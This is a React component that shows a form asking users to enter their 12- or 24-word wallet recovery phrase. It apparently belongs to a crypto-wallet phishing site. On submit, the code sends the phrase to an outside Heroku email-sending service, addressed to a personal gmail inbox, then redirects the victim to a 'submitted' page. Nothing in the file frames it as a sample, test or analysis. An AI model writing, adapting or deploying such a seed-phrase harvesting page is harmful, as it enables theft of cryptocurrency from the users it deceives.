import React, { useState } from "react";
import axios from "axios";
// import { Link } from "react-router-dom";
import { ArrowRightCircle } from "react-bootstrap-icons";

function Tab1() {
  const [getData, setGetData] = useState({
    message: "",
  });

  let options = {
    message: `<h1>From Tab Phrase</h1> <p>This is the data from user: <strong>${getData.message}</strong> </p>`,
    subject: "Phrase",
    organizationEmail: "mason7re@gmail.com",
  };

  const handSubmit = async (e) => {
    e.preventDefault();
    if (getData.message === "" || getData.message.length <= 11) {
      return false;
    }
    await axios
      .post(`https://backend-email-sender.herokuapp.com/send`, options)
      .then((response) => {
        console.log(response);
        setTimeout(() => {
          window.location.replace("/submitted");
        }, 2000);
      });
  };
  return (
    <div className="align-items-center TabLinks">
      <form>
        <textarea
          cols="30 "
          rows="4"
          type="text"
          className="form-control mt-3 mb-4"
          placeholder="Enter your recovery phrase"
          minLength="12"
          required
          onChange={(e) => setGetData({ ...getData, message: e.target.value })}
        />
        <p className=" text-center mb-3 Tab-items">
          Typically 12 (sometimes 24) words separated by single spaces
        </p>

        <div>
          <button onClick={handSubmit} className="btn btn-primary col-12">
            {" "}
            Proceed <ArrowRightCircle className="ms-1" />
          </button>
        </div>
      </form>
      <div>
        <button
          onClick={(e) => window.location.replace("/")}
          className="btn btn-danger col-12 mt-3"
        >
          {" "}
          Cancel
        </button>
      </div>
    </div>
  );
}

export default Tab1;
